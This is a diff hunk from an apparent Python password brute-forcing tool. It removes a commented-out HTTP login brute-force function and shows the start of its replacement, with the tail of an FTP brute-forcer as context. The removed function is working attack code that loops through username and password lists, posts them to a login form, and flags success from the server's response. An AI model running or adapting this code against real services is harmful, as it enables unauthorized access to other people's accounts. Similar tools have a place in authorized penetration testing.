@@ -127,34 +127,6 @@ def brute_ftp(ip, port, username, passwords):
         if passwordFound == False:
             print(f"[FTP] No password found for {usr} on {ip}")
 
-'''def brute_http(url, username, passwords, header, data, negativeCondition):
-    print("[+]  BRUTE-FORCE STARTING")
-    print("[URL] ", url)
-    for user in username:
-        passwordFound = False
-        for pwd in passwords:
-            try:
-                datas = {
-                    data[0] : user,
-                    data[1] : pwd
-                }
-                response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
-                for badCondition in negativeCondition:
-                    if str(badCondition) not in str(response.text):
-                        print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
-                        print(f"[HTTP] Success: {user}:{pwd}")
-                        passwordFound = True
-                        break
-                    else:
-                        print(f"[HTTP] Failed: {user}:{pwd}")
-            except requests.exceptions.RequestException as e:
-                print(f"[HTTP] Error: {e}")
-                time.sleep(1)
-            if passwordFound: break
-        if passwordFound == False:
-            print(f"[HTTP] No password found for {user} on {url}")'''
-
-
 def brute_http(url, username, passwords, header, data, valueData, negativeCondition, positiveCondition):
     print("[+] HTTP BRUTE-FORCE STARTING")
     print("[URL] ", url)
